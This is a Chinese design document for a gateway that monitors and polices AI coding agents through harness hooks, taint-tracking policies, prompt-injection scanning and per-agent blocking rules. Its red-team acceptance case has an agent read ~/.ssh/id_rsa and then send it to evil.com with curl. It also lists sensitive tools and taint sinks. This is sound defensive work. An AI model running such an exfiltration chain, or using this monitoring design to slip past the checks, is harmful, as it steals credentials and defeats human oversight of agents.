# ASG 详细设计 v1 —— 照此实施

> 配套文档：`NEXT-PLAN.md`（定位与选型决策）。本文件是**实施级设计**：数据结构、接口签名、文件清单、配置项、错误码、验收脚本。
> 基线：`3c3c8e4`。所有"新增/修改"标注到具体文件与函数。

---

## 目录

- [1. 现有契约（不可随意改动的基础）](#1-现有契约)
- [2. M1 接入闭环](#2-m1-接入闭环)
- [3. M2 存储与显示](#3-m2-存储与显示)
- [4. M3 管控落地](#4-m3-管控落地核心)
- [5. M4 控制台重构](#5-m4-控制台重构)
- [6. M5 运维加固](#6-m5-运维加固)
- [7. 配置项总表](#7-配置项总表)
- [8. 错误码总表](#8-错误码总表)
- [9. 场景矩阵](#9-场景矩阵)

---

## 1. 现有契约

这些是已在跑的类型，新代码必须复用而非另起炉灶。

### 1.1 `api/types.go`（201 行，Go/Python 共享模型）

```go
type Axis int      // AxisPermission | AxisDataNetwork | AxisBehavior
type Phase int     // PhasePre | PhaseRuntime | PhasePost
type Verdict int   // VerdictAllow < VerdictRedact < VerdictConfirm < VerdictBlock
type FailMode int  // FailOpen | FailClosed
type Trust int     // TrustTrusted | TrustUntrusted

type Taint struct { Source string; Trust Trust }
type Principal struct { UserID, AgentID, SessionID, Role string }

type ToolCall struct {
    CallID    string
    Principal Principal
    ToolID    string   // "database.delete_user"
    Resource  string   // "database.users"
    Action    string   // read|write|delete|network
    Arguments []byte   // JSON
    Taints    []Taint
    Timestamp time.Time
}
type ToolResult struct { CallID string; Output []byte; Error bool; ResultTaints []Taint }
type Redaction struct { Path, Match, Reason, Replace string }
type Signal struct { Axis; Engine string; Score int; Verdict; Reasons []string;
                     Evidence []Evidence; FailMode; Redactions []Redaction }
type Decision struct { CallID string; Phase; Final Verdict; Signals []Signal;
                       Rationale string; Risk int }
type Event struct { SessionID, TraceID, ParentID string; Call ToolCall;
                    Result *ToolResult; Decision Decision; Timestamp time.Time }
```

**关键洞察**：`ToolCall` 是通用的"一次受控操作"，**不是 MCP 专属**。M3 把 LLM 请求也建模成 `ToolCall`（`ToolID="llm.chat"`，`Arguments`=请求体）即可复用整套引擎，无需新接口。

### 1.2 `internal/engine/engine.go`（引擎接口，191 行）

```go
type Engine interface {
    Name() string
    Axis() api.Axis
    FailMode() api.FailMode
    EvaluatePre(ctx, *api.ToolCall) (*api.Signal, error)
    EvaluateRuntime(ctx, *api.ToolCall, Stream) (*api.Signal, error)
    EvaluatePost(ctx, *api.ToolCall, *api.ToolResult) (*api.Signal, error)
}

type Registry struct { engines []Engine }
func (r *Registry) EvaluatePre(ctx, c) api.Decision   // 并行，4s 超时
func (r *Registry) EvaluatePost(ctx, c, res) api.Decision
func Aggregate(callID, phase, signals) api.Decision   // 一票否决：任一 BLOCK → BLOCK
```

聚合规则：`任一 BLOCK → BLOCK；否则任一 CONFIRM → CONFIRM；否则任一 REDACT → REDACT；否则 ALLOW`。`Risk = max(score)`。
引擎报错时按 `FailMode` 归一化（`normalize()`），**不会静默消失**。

> **M3 只需把 `Registry` 从 MCP 路径复制到 LLM 路径**，引擎本身零改动。这是本项目最大的架构红利。

### 1.3 `internal/agentregistry`（Record 47 字段，18 个函数）

```go
type Record struct {
    SessionID, AgentID, ProbeID, MachineID, MachineName, Alias, AgentType string
    ProcessID int; OS, User, IP string
    DeclaredIPs, ObservedIPs []string; ConnectionIP string
    Model, Provider string
    DeclaredModel, ObservedModel, DeclaredProvider, ObservedProvider string  // ← 真值标注已有基础
    Status, Isolation string
    SessionIDs []string
    RegisteredAt, LastHeartbeat, LastActivity, StateChangedAt time.Time
    StateChangedBy string; RestartCount int
    Changes []Change     // ← 模型变更历史已有基础
}
type Change struct { At time.Time; Field, From, To, Source string }

const activeWindow = 5 * time.Minute
```

已有函数：`Open` `Upsert` `Heartbeat` `ObserveModel` `ObserveSession` `SetAlias` `SetIsolation` `List` `ListActive` `Get`。

**发现**：`DeclaredModel` / `ObservedModel` 和 `Changes` 字段**已经存在**，M2 的"来源标注"和"模型变更历史"是**接线**而非新建。

---

## 2. M1 接入闭环

### 2.1 目标

远端执行**分步可读命令**（交给 agent 自己跑），之后正常使用 harness，控制台可见**工具调用链路**。全程不改 base_url、不设 OTEL 变量、不污染输入框。

### 2.2 新增文件

```
cmd/asg-connect/
  init.go            # asg-connect init  子命令
  uninstall.go       # asg-connect uninstall 子命令
  harness/
    detect.go        # 探测已安装 harness
    claudecode.go    # Claude Code hook 注入/回滚
    opencode.go      # OpenCode plugin 注入/回滚
    codex.go         # Codex notify 注入/回滚
    types.go         # Harness 接口
internal/webui/
  activity_api.go    # 从 otlp_api.go 拆出，扩展 payload
internal/activity/
  chain.go           # 工作链路聚合（session → steps）
  chain_test.go
```

### 2.3 Harness 适配接口

```go
// cmd/asg-connect/harness/types.go
package harness

type Harness interface {
    // Name 返回稳定标识："claude-code" | "opencode" | "codex" | "gemini-cli"
    Name() string
    // Detect 判断本机是否安装了该 harness，返回配置文件路径
    Detect() (configPath string, found bool)
    // Install 幂等地把 ASG hook 合并进配置文件；返回备份文件路径
    Install(cfg InstallConfig) (backupPath string, err error)
    // Uninstall 移除 ASG hook（优先从备份还原，失败则精确删除 ASG 段）
    Uninstall() error
    // Verify 读回配置，确认 ASG hook 存在且格式合法
    Verify() (ok bool, detail string)
}

type InstallConfig struct {
    HubURL      string // https://asg-gateway.vip.cpolar.cn
    AgentID     string // <machine-id>-<harness>
    TenantKey   string
    DetailLevel string // minimal | tool | full
    SampleRate  float64
    Events      []string // PostToolUse, SessionStart, Stop ...
}
```

### 2.4 Claude Code 适配（`harness/claudecode.go`）

**配置文件**：`~/.claude/settings.json`
**规范出处**：`https://code.claude.com/docs/en/hooks`

**注入内容**（合并进已有 JSON 的 `hooks` 键，**绝不整文件覆盖**）：

```json
{
  "hooks": {
    "SessionStart": [{
      "matcher": "*",
      "hooks": [{
        "type": "command",
        "async": true,
        "command": "ASG_EVENT=session_start /usr/local/bin/asg-report"
      }]
    }],
    "PostToolUse": [{
      "matcher": "*",
      "hooks": [{
        "type": "command",
        "async": true,
        "command": "/usr/local/bin/asg-report"
      }]
    }],
    "Stop": [{
      "matcher": "*",
      "hooks": [{
        "type": "command",
        "async": true,
        "command": "ASG_EVENT=session_end /usr/local/bin/asg-report"
      }]
    }]
  }
}
```

**为什么用独立脚本 `asg-report` 而不是内联 curl**：
1. 内联 curl 要在 JSON 里三层转义引号，极易写坏（本轮已踩坑）。
2. 脚本可读 stdin 的 hook payload（Claude Code 通过 stdin 传 JSON，含 `tool_name` / `tool_input` / `session_id`）。
3. 升级上报逻辑不用改 harness 配置。

**`asg-report` 脚本内容**（安装时写入，`chmod +x`）：

```sh
#!/bin/sh
# ASG activity reporter. Reads hook payload from stdin, posts to hub.
# Never blocks the harness: backgrounded, output discarded, 2s timeout.
PAYLOAD=$(cat 2>/dev/null)
{
  curl -sS --max-time 2 -X POST "$ASG_HUB/api/activity" \
    -H 'Content-Type: application/json' \
    -H "X-ASG-Agent-Id: $ASG_AGENT_ID" \
    -H "X-ASG-Key: $ASG_TENANT_KEY" \
    --data-binary @- <<JSON
{"agent_id":"$ASG_AGENT_ID","agent_type":"$ASG_HARNESS",
 "event":"${ASG_EVENT:-tool_use}","hook_payload":$PAYLOAD}
JSON
} >/dev/null 2>&1 &
exit 0
```

配置常量（`ASG_HUB` 等）由安装时写入脚本头部，不依赖用户 shell 环境 —— **这是关键**：不碰 `.zshrc`，就不会有环境变量污染。

**幂等**：注入前先检查 `hooks.PostToolUse[].hooks[].command` 是否已含 `asg-report`；有则跳过。
**备份**：`~/.claude/settings.json.asg-backup-<unix-ts>`。
**回滚**：`asg-connect uninstall` 优先还原最新备份；备份缺失则从 JSON 中精确删除含 `asg-report` 的 hook 项。

### 2.5 OpenCode 适配（`harness/opencode.go`）

**配置文件**：`~/.config/opencode/opencode.jsonc`
**方式**：`plugin` 数组追加 `@devtheops/opencode-plugin-otel`（本机已验证可用），并写 `experimental.openTelemetry: true`。
**差异**：OpenCode 的 OTLP 实现稳定，可直接走通道 3，拿到 span 属性里的模型真值。

### 2.6 `/api/activity` 契约（扩展现有端点）

**请求**：
```
POST /api/activity
Content-Type: application/json
X-ASG-Agent-Id: <agent_id>      (可选，body 优先)
X-ASG-Key: <tenant_key>

{
  "agent_id":   "fe173f09-claude-code",
  "agent_type": "claude-code",
  "event":      "tool_use" | "session_start" | "session_end" | "llm_request",
  "model":      "claude-sonnet-4-6",          // 可选
  "session_id": "asg-company-onboarding",     // 可选
  "hook_payload": { ... }                      // 原样透传的 harness payload
}
```

**服务端处理**（`internal/webui/activity_api.go`）：
1. 解析 `agent_id`（body → header），未注册则 `{"status":"ignored","reason":"not registered"}`，**不建行**（沿用现有规则）。
2. 从 `hook_payload` 提取（各 harness 字段名不同，写映射表）：
   - Claude Code：`tool_name` / `tool_input` / `session_id` / `cwd`
   - OpenCode：`tool` / `args` / `sessionID`
3. 归一化成 `activity.Step`：
   ```go
   type Step struct {
       At        time.Time
       AgentID   string
       SessionID string
       Kind      string   // tool_use | session_start | session_end | llm_request
       ToolName  string   // Read / Edit / Bash / WebFetch ...
       Summary   string   // 参数摘要，按 DetailLevel 裁剪
       Verdict   string   // ALLOW / BLOCK ...（M3 接入引擎后填充）
       Reason    string
       Taints    []string
   }
   ```
4. 写入存储 + 推进 `LastActivity` + `ObserveSession`；若带 `model` 则 `ObserveModel`。
5. **M3 起**：在此处调用 `engine.Registry.EvaluatePre()`，把 `Step` 转成 `api.ToolCall` 过策略。

**响应**：
```json
{"status":"ok","verdict":"ALLOW"}
```
M3 起若判定 BLOCK，返回 `{"status":"ok","verdict":"BLOCK","code":"...","message":"..."}`，由 `PreToolUse` hook 依据退出码阻断（Claude Code 规范：hook 非零退出可阻止工具执行）。

### 2.7 在线三态（修改 `internal/agentregistry/registry.go`）

```go
const (
    activityWindow  = 5 * time.Minute  // 有真实活动 → active
    heartbeatWindow = 2 * time.Minute  // 有心跳无活动 → idle
)

// Status 计算（替换现有 isActiveRecord）
func computeStatus(r Record, now time.Time) string {
    if now.Sub(r.LastActivity) <= activityWindow { return "active" }
    if now.Sub(r.LastHeartbeat) <= heartbeatWindow { return "idle" }
    return "offline"
}
```

UI 两个指示灯：**活动灯**（active 绿 / 否则灰）+ **进程灯**（心跳在窗内绿 / 否则灰）。
offline 记录**永不自动删除**，仅 `DELETE /api/agents/{id}` 手动移除。

### 2.8 分步接入命令（交付给远端 agent 的文案）

```bash
# 步骤 1：下载探针（单文件，无依赖）
curl -fsSL https://asg-gateway.vip.cpolar.cn/dist/asg-connect-darwin-arm64 -o /tmp/asg-connect
chmod +x /tmp/asg-connect && sudo mv /tmp/asg-connect /usr/local/bin/asg-connect

# 步骤 2：查看本机检测到哪些 agent 工具（只读，不改任何东西）
asg-connect detect

# 步骤 3：接入（自动备份原配置；--dry-run 可先看将要写入什么）
asg-connect init --hub https://asg-gateway.vip.cpolar.cn --key <TENANT_KEY> --dry-run
asg-connect init --hub https://asg-gateway.vip.cpolar.cn --key <TENANT_KEY>

# 步骤 4：自检（确认注册成功 + 配置写对）
asg-connect verify

# 如需回滚
asg-connect uninstall
```

**注意**：步骤 3 之后**不需要重启 shell、不需要 source 任何文件**。Claude Code 下次启动时读取 `settings.json` 即生效。

### 2.9 M1 验收脚本

```bash
# 网关侧执行
curl -s $HUB/api/agents | jq '.[] | {agent_id, status, last_activity}'
curl -s "$HUB/api/agents/detail?agent_id=<id>" | jq '.chain[] | {at, tool, verdict}'
```
**通过判据**：
1. 远端仅执行 2.8 的 4 步，未改 `ANTHROPIC_BASE_URL`，未设任何 `OTEL_*`。
2. 远端正常用 Claude Code 做一个任务后，`chain` 数组出现该任务的工具序列。
3. 5 分钟内 `status=active`；退出 Claude Code 后 2 分钟转 `idle`，再过 5 分钟转 `offline`，**行不消失**。
4. `asg-connect uninstall` 后 `settings.json` 与安装前 `diff` 为空。

---

## 3. M2 存储与显示

### 3.1 SQLite 迁移

**选型**：`modernc.org/sqlite`（纯 Go，无 CGO，Windows 直接 `go build`）
**替换**：`internal/store`（174 行，当前 JSONL append）

**Schema**：

```sql
CREATE TABLE IF NOT EXISTS agents (
  agent_id      TEXT PRIMARY KEY,
  record_json   TEXT NOT NULL,          -- 完整 Record，避免 47 列展开
  status        TEXT NOT NULL,
  last_activity INTEGER NOT NULL,       -- unix ms
  last_heartbeat INTEGER NOT NULL,
  updated_at    INTEGER NOT NULL
);
CREATE INDEX idx_agents_activity ON agents(last_activity DESC);

CREATE TABLE IF NOT EXISTS events (
  id         INTEGER PRIMARY KEY AUTOINCREMENT,
  ts         INTEGER NOT NULL,
  agent_id   TEXT NOT NULL,
  session_id TEXT,
  trace_id   TEXT,
  parent_id  TEXT,
  kind       TEXT NOT NULL,             -- tool_use | llm_request | session_start ...
  tool_name  TEXT,
  verdict    TEXT,
  risk       INTEGER DEFAULT 0,
  payload    TEXT NOT NULL              -- 完整 api.Event JSON
);
CREATE INDEX idx_events_agent_ts ON events(agent_id, ts DESC);
CREATE INDEX idx_events_session  ON events(session_id, ts);
CREATE INDEX idx_events_trace    ON events(trace_id, ts);
CREATE INDEX idx_events_verdict  ON events(verdict) WHERE verdict != 'ALLOW';

CREATE TABLE IF NOT EXISTS model_history (
  id       INTEGER PRIMARY KEY AUTOINCREMENT,
  agent_id TEXT NOT NULL,
  at       INTEGER NOT NULL,
  from_model TEXT,
  to_model   TEXT NOT NULL,
  source     TEXT NOT NULL              -- self-reported | gateway-observed
);
CREATE INDEX idx_model_history_agent ON model_history(agent_id, at DESC);

CREATE TABLE IF NOT EXISTS policies (
  id        INTEGER PRIMARY KEY AUTOINCREMENT,
  agent_id  TEXT,                        -- NULL = 全局默认
  axis      TEXT NOT NULL,
  rule_id   TEXT NOT NULL,
  action    TEXT NOT NULL,               -- log | alert | block
  enabled   INTEGER NOT NULL DEFAULT 1,
  updated_at INTEGER NOT NULL
);
CREATE UNIQUE INDEX idx_policies_scope ON policies(COALESCE(agent_id,''), rule_id);
```

**轮转**（用户答复：按条数上限）：
```go
// 每写入 1000 条触发一次
DELETE FROM events WHERE id < (SELECT MAX(id) - :max_events FROM events);
```
默认 `max_events = 200000`。

**审计原件**（用户答复：保留合规友好的追加式）：
`events.jsonl` 继续双写，但加**按大小轮转**（`events.jsonl.1` … 保留 5 份 × 64MB）。

**原子写**：`agents.json` 路径废弃，并入 SQLite。若保留导出功能，用 `写 tmp → os.Rename` 原子替换，杜绝 BOM 崩溃复现。

### 3.2 模型真值来源标注（接线已有字段）

- `DeclaredModel`：harness 自报（hook / OTLP）→ UI 灰色 + `self-reported` 徽标
- `ObservedModel`：网关亲眼所见（Proxy 通道请求体）→ UI 绿色 + `gateway-observed` 徽标
- `Model`（展示值）：优先 `ObservedModel`，否则 `DeclaredModel`
- 变更写 `model_history` 表 + `Record.Changes`

### 3.3 删除项

- `internal/receipt`（271 行）+ `/api/receipts` `/api/receipts/verify`（用户答复：签名回执不需要）
- `data/*.bak*` 清理并加 `.gitignore`

---

## 4. M3 管控落地（核心）

### 4.1 把三轴引擎接到 LLM 路径

**现状**：`engine.Registry` 只在 `cmd/gateway/main.go` 里挂给 `proxy.Gateway`（MCP 路径）。
**改造**：抽出共享构造函数，让**三个入口**共用同一个 Registry。

```go
// internal/engine/build.go （新增）
type BuildOptions struct {
    CedarPolicyPath string
    RulesPath       string
    TaintSources    []string
    TaintSinks      []string
    BehaviorSidecar string
    LLMGuardSidecar string
    Store           *session.Store
    IncludeExperimental bool
}
func Build(opts BuildOptions) (*Registry, error)
```

**三个接入点**：
| 入口 | 文件 | 建模方式 |
|---|---|---|
| MCP 工具调用 | `internal/proxy/gateway.go`（现有） | `ToolCall{ToolID: "mcp.<tool>"}` |
| LLM 请求 | `cmd/asg-connect/serve.go` `handleLLM` | `ToolCall{ToolID:"llm.chat", Arguments: 请求体}` |
| Hook 上报的工具 | `internal/webui/activity_api.go` | `ToolCall{ToolID:"tool.<name>", Arguments: hook_payload.tool_input}` |

**敏感操作额外把关**（用户要求）：新增 `internal/engine/sensitive.go`
```go
// 高危工具白名单外一律 CONFIRM
var sensitiveTools = map[string]string{
    "Bash":       "shell execution",
    "Write":      "file write",
    "Edit":       "file mutation",
    "WebFetch":   "outbound network",
    "mcp.*.delete_*": "destructive",
}
```
命中 → `VerdictConfirm`（人工审批）或按 per-agent 策略降级为 `log`。

### 4.2 行为轴落地（Invariant）

**现状**：`internal/engine/behavior.go` 已写好 Go 侧，指向 `http://127.0.0.1:8901`，但 sidecar 没真正跑。
**动作**：
1. 补 `intelligence/analyzer/sidecar.py` 的实际 Invariant policy（DSL 表达"不可信来源 → 外发"因果规则）
2. 依赖：`invariantlabs-ai/invariant`（pip）
3. `deploy/config.dev.yaml` 已有 `behavior_sidecar_url` / `behavior_fail_open`，接上即可
4. **fail_open 默认 true**（sidecar 挂了不阻断业务），生产可切 false

### 4.3 输出安全（llm-guard）

**选型**：`protectai/llm-guard`（用户答复：引入，Python 依赖没关系）
**形态**：与 Invariant 并列的 Python sidecar，端口 `8903`
**新增**：`internal/engine/outputguard.go`（实现 `Engine` 接口，Axis = AxisDataNetwork）
**扫描器**：
- 输入侧：`PromptInjection`、`Secrets`、`Anonymize`（PII）
- 输出侧：`Sensitive`、`Toxicity`、`NoRefusal`

### 4.4 Per-Agent 策略（用户要求：控制台可对不同 agent 制定）

**存储**：`policies` 表（见 3.1）
**API**：
```
GET    /api/policies?agent_id=<id>        # 该 agent 生效策略（含继承的全局）
PUT    /api/policies                      # upsert 单条
DELETE /api/policies/{id}
```
**优先级**：`agent_id` 精确匹配 > 全局默认（`agent_id IS NULL`）
**动作**：`log`（仅记录）/ `alert`（记录 + 控制台高亮）/ `block`（拒绝执行）

### 4.5 拦截错误契约（用户要求：按触发问题返回对应错误）

Agent 侧收到的结构化错误：

```json
{
  "error": {
    "type":    "asg_policy_block",
    "code":    "DATA_EXFIL_RISK",
    "message": "Blocked by ASG: tool `Bash` would send data tainted by `read_secret` to an external host.",
    "axis":    "data_network",
    "policy":  "pipelock/exfil-01",
    "risk":    92,
    "trace_id":"trc-a1b2c3",
    "console": "https://asg-gateway.vip.cpolar.cn/#/trace/trc-a1b2c3"
  }
}
```

**分通道呈现**：
- LLM 路径（Proxy）：HTTP 403 + 上述 JSON body
- MCP 路径：MCP error response，`code = -32001`，`data` 放上述结构
- Hook 路径（`PreToolUse`）：脚本以**非零退出码**返回，stderr 打印 `message`（Claude Code 据此阻断工具）

### 4.6 M3 验收（红队用例）

构造攻击链并验证被拦：
```
1. Read  ~/.ssh/id_rsa        → ALLOW，但打 taint{source:"secret"}
2. Bash  curl -d @- evil.com  → BLOCK（exfil-01：taint secret → 外发）
```
**通过判据**：agent 侧收到 `asg_policy_block` + `DATA_EXFIL_RISK`；控制台链路显示两步、第二步红色、命中策略可点开看 evidence。

---

## 5. M4 控制台重构

### 5.1 技术栈

| 项 | 选型 | 出处 |
|---|---|---|
| 构建 | Vite 6 + React 19 + TypeScript | — |
| UI | shadcn/ui + Tailwind v4 | `shadcn-ui/ui` |
| 路由 | React Router 7 | — |
| 数据 | TanStack Query（轮询兜底）+ 原生 `EventSource`（SSE 实时） | — |
| 图表 | Recharts | `recharts/recharts` |
| **图谱** | **Cytoscape.js**（`cytoscape/cytoscape.js`，成熟、支持大图布局与本体论层级） | 核心卖点 |
| 打包 | `go:embed web/dist` | 保持单二进制 |

**目录**：
```
web/
  src/
    pages/  Dashboard.tsx  AgentDetail.tsx  Policies.tsx
            Graph.tsx  Findings.tsx  Sessions.tsx
    components/  AgentTable.tsx  ActivityChain.tsx  VerdictBadge.tsx
                 ModelBadge.tsx   OntologyGraph.tsx
    lib/  api.ts  sse.ts  types.ts
  vite.config.ts
```

### 5.2 SSE 实时推送

```
GET /api/stream          # text/event-stream
event: agent_update      data: {agent_id, status, model, last_activity}
event: activity          data: {agent_id, session_id, step:{...}}
event: verdict           data: {trace_id, verdict, policy, risk}
```
服务端：`internal/webui/stream_api.go`，内存 fan-out（`map[chan Event]struct{}` + `sync.RWMutex`），客户端断线自动清理。轮询作为降级兜底。

### 5.3 页面与子系统 UI（用户要求：四个子系统补 UI）

| 页面 | 消费的现有 API | 内容 |
|---|---|---|
| Dashboard | `/api/agents` `/api/stream` | agent 表（双指示灯、模型+来源徽标）、风险计数 |
| AgentDetail | `/api/agents/detail` | **工作链路时间线**（每步工具+判定+taint）、模型变更历史、会话列表 |
| Policies | `/api/policies` | per-agent 策略矩阵，三态动作切换 |
| **Graph** | `/api/kg/graph/nodes` `/edges` `/path` `/ask` | **semantic 本体论图谱（核心卖点）**，Cytoscape 渲染，支持按 taint 溯源路径高亮 |
| Findings | `/api/judge/findings` `/api/monitor/findings` | judge + monitor 两个子系统的发现列表 |
| Sessions | `/api/sessions` `/api/trajectory` | 会话轨迹回放 |

告警**先不接外部出口**（用户答复），仅前端高亮 + 计数。

---

## 6. M5 运维加固

### 6.1 进程自愈（Windows）

**选型**：`nssm`（Non-Sucking Service Manager，免费）
**托管四进程**：

| 服务名 | 可执行 | 端口 | 依赖 |
|---|---|---|---|
| `ASG-Gateway` | `bin/gateway.exe serve -config deploy/config.dev.yaml` | 8090 | — |
| `ASG-Connect` | `bin/asg-connect.exe serve -config connect.yaml` | 8181 | — |
| `ASG-Cpolar` | `cpolar.exe start-all` | — | Gateway |
| `ASG-KGWorker` | `python internal/kgbridge/asg_kg_worker.py` | 8902 | — |

配置：`AppExit Default Restart`、`AppRestartDelay 5000`、`AppStdout/AppStderr` 轮转日志。
脚本：`scripts/install-services.ps1` / `uninstall-services.ps1`。

### 6.2 测试补齐（用户答复：功能优先，测试跟进）

**唯一硬性要求**：`cmd/asg-connect` 从 3% → 60%+（这里出过"永远 hy3"的生产 bug）。
优先补：`route()` 路由选择、`sessionID` 兜底、`handleLLM` 引擎接入、`init/uninstall` 幂等与回滚。

---

## 7. 配置项总表

### 7.1 网关 `deploy/config.dev.yaml`（新增项标 ★）

```yaml
listen: ":8090"
llm_upstream_url: "http://127.0.0.1:8181"
upstream_command: ["./bin/upstream-mcp"]

cedar_policy_path: "./deploy/policies/permission.cedar"
rules_path: "./deploy/rules/pipelock-community.yaml"
include_experimental_rules: false

taint_sources: ["get_inbox", "read_secret", "fetch", "read_file"]
taint_sinks:   ["send_email", "http_post", "export_all_users"]

behavior_sidecar_url: "http://127.0.0.1:8901"
behavior_fail_open: true

★ outputguard_sidecar_url: "http://127.0.0.1:8903"   # llm-guard
★ outputguard_fail_open: true

kg_python_bin: "python"
kg_worker_script: "internal/kgbridge/asg_kg_worker.py"
kg_semantica_path: "D:/proj/semantica"
kg_port: 8902

★ storage:
★   driver: "sqlite"                  # sqlite | jsonl(legacy)
★   dsn: "./data/asg.db"
★   max_events: 200000                # 条数上限轮转
★   audit_jsonl: true                 # 保留合规审计原件
★   audit_jsonl_max_mb: 64
★   audit_jsonl_keep: 5

★ agent_status:
★   activity_window: "5m"
★   heartbeat_window: "2m"

★ sensitive_tools: ["Bash", "Write", "Edit", "WebFetch"]
★ sensitive_action: "confirm"          # log | alert | confirm | block
```

### 7.2 探针 `connect.yaml`

```yaml
hub_url: "https://asg-gateway.vip.cpolar.cn"
tenant_name: "local"
tenant_key: "<REDACTED>"
agent_id: ""                  # 空则自动 <machine-id>-<harness>

★ install:
★   detail_level: "tool"      # minimal | tool | full
★   sample_rate: 1.0
★   events: ["PostToolUse", "SessionStart", "Stop"]

providers:                     # Proxy 通道（可选）
  - name: opencode-zen
    base_url: "https://opencode.ai/zen/go/v1"
    api_key: "<REDACTED>"
    default_model: "hy3"
    # allowed_models / model_map 已永久删除：模型必须透传
```

---

## 8. 错误码总表

| code | axis | 触发 | agent 侧动作 |
|---|---|---|---|
| `DATA_EXFIL_RISK` | data_network | taint 数据流向外部 sink | BLOCK |
| `SSRF_BLOCKED` | data_network | 目标为内网/元数据地址 | BLOCK |
| `SECRET_IN_ARGS` | data_network | 参数含密钥模式 | REDACT |
| `PII_DETECTED` | data_network | llm-guard PII 命中 | REDACT |
| `PROMPT_INJECTION` | data_network | llm-guard 注入检测 | BLOCK |
| `PERMISSION_DENIED` | permission | Cedar 拒绝 | BLOCK |
| `RESOURCE_OUT_OF_SCOPE` | permission | 越权资源 | BLOCK |
| `SENSITIVE_OP_CONFIRM` | permission | 敏感工具需审批 | CONFIRM |
| `CAUSAL_CHAIN_VIOLATION` | behavior | Invariant 因果规则命中 | BLOCK |
| `TRAJECTORY_ANOMALY` | behavior | 轨迹异常 | ALERT |
| `ENGINE_UNAVAILABLE` | — | FailClosed 引擎不可用 | BLOCK |

---

## 9. 场景矩阵

| 场景 | 通道 | 可见性 | 管控力度 | 备注 |
|---|---|---|---|---|
| Mac + Claude Code + cc-switch | Hook | 工具链路、会话、活动 | Hook 可阻断工具（PreToolUse 非零退出） | 模型 = self-reported |
| 本机 + OpenCode | Hook + OTLP | 链路 + token/cost | 同上 | 模型 = self-reported（OTLP span） |
| 自研 agent 愿改 base_url | Proxy | **全量请求/响应** | **三轴全生效** | 模型 = gateway-observed ✅ |
| 通过 `/mcp` 的工具调用 | MCP | 工具参数与结果 | 三轴全生效 | 现状已支持 |
| 离线机器 | — | 显示 offline（不消失） | — | 仅手动删除 |
| 一机多 harness | 各自 Hook | **每 harness 一行** | 各自策略 | agent_id = machine-id + harness |
| 多租户 SaaS | 全部 | 按 tenant_key 隔离 | per-agent 策略 | `internal/authn` 已有租户模型 |

---

## 10. 实施顺序与停止点

```
M1 接入闭环   → 远端一次安装，链路可见，可回滚
M2 存储显示   → SQLite + 模型真值标注 + 砍回执
M3 管控落地   → 三轴上 LLM 路径 + Invariant + llm-guard + per-agent 策略  ★核心
M4 控制台     → React + SSE + 本体论图谱  ★卖点
M5 运维       → nssm 自愈 + 探针测试补到 60%
```

**当前状态：设计完成，等待开工指令。**
